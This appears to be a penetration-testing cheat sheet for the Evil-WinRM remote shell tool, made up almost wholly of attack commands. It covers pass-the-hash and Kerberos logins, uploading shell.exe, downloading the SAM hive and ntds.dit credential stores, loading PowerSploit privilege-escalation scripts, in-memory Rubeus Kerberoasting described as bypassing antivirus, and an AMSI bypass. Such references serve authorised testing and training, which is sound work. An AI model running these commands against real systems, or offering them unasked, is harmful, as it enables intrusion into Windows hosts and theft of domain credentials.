title: Evil-WinRM
html:
Evil-WinRM

Full-featured WinRM shell for pentesting. Supports password, hash, and Kerberos authentication; file upload/download; PowerShell script loading; and .NET assembly execution.

Basic Connection

# Password auth
evil-winrm -i <ip> -u <username> -p <password>

# With domain
evil-winrm -i <ip> -u <domain>\<username> -p <password>
evil-winrm -i <ip> -u <username> -p <password> -r <domain>

# Specify port (default 5985)
evil-winrm -i <ip> -u <username> -p <password> -P 5985

Pass the Hash

# NTLM hash (LM:NT or just NT)
evil-winrm -i <ip> -u <username> -H <nt-hash>
evil-winrm -i <ip> -u <username> -H aad3b435b51404eeaad3b435b51404ee:<nt-hash>

# With domain
evil-winrm -i <ip> -u <domain>/<username> -H <nt-hash>

# Administrator PtH
evil-winrm -i <ip> -u administrator -H <nt-hash>

Kerberos Authentication

# Export ccache ticket first
export KRB5CCNAME=/tmp/<username>.ccache

# Connect with Kerberos (no password needed)
evil-winrm -i <hostname> -r <domain> -u <username>

# Must use hostname (not IP) with Kerberos
evil-winrm -i <dc-host> -r <realm> -u <username>

# If clock skew: use faketime
faketime <faketime> evil-winrm -i <hostname> -r <domain> -u <username>

SSL (HTTPS / Port 5986)

# SSL connection (port 5986)
evil-winrm -i <ip> -u <username> -p <password> -S
evil-winrm -i <ip> -u <username> -p <password> -P 5986 -S

# With client certificate
evil-winrm -i <ip> -u <username> -p <password> -S -c <cert> -k <key>

# Ignore SSL errors
evil-winrm -i <ip> -u <username> -p <password> -S --no-ssl-peer-verification

File Upload / Download

# Inside the evil-winrm shell:

# Upload file to target
upload /local/path/tool.exe C:\Windows\Temp\tool.exe
upload /tmp/shell.exe

# Download file from target
download C:\Users\<username>\Desktop\root.txt /tmp/root.txt
download C:\Windows\System32\config\SAM /tmp/SAM

# Download NTDS
download C:\Windows\NTDS\ntds.dit /tmp/ntds.dit

Loading PowerShell Scripts

# Specify scripts directory at startup — auto-loads .ps1 files
evil-winrm -i <ip> -u <username> -p <password> -s /opt/privesc/

# Inside shell — load a script (make it available as a command)
PowerView.ps1
Invoke-AllChecks

# Common script directories
evil-winrm -i <ip> -u <username> -p <password> -s /usr/share/windows-resources/powersploit/Privesc/
evil-winrm -i <ip> -u <username> -p <password> -s /opt/PowerSploit/Privesc/

.NET Assembly Execution

# Specify executables directory — Invoke-Binary loads them in-memory
evil-winrm -i <ip> -u <username> -p <password> -e /opt/tools/

# Inside shell — execute .NET assembly in memory (bypasses AV)
Invoke-Binary /opt/tools/Rubeus.exe kerberoast /outfile:hashes.txt
Invoke-Binary /opt/tools/SharpUp.exe audit
Invoke-Binary /opt/tools/Seatbelt.exe -group=all

Useful In-Shell Commands

# Show available evil-winrm commands
menu

# Bypass AMSI (run inside shell)
Bypass-4MSI

# Check if running as local admin
whoami /all
net localgroup administrators

# Check WinRM service
Get-Service WinRM

# Enable WinRM on target (if you have RCE)
Enable-PSRemoting -Force
winrm quickconfig
Set-Item wsman:\localhost\client\trustedhosts *

Connection Tips

# Through proxychains (SOCKS tunnel)
proxychains evil-winrm -i <ip> -u <username> -p <password>

# Check WinRM port open first
nmap -p 5985,5986 <ip>
curl -s http://<ip>:5985/wsman

# Test credentials before connecting
nxc winrm <ip> -u <username> -p <password>
nxc winrm <ip> -u <username> -H <nt-hash>
excerpt: Evil-WinRM full-featured WinRM shell. Password, pass-the-hash, Kerberos auth. File upload/download, PowerShell script loading, in-memory .NET assembly execution.
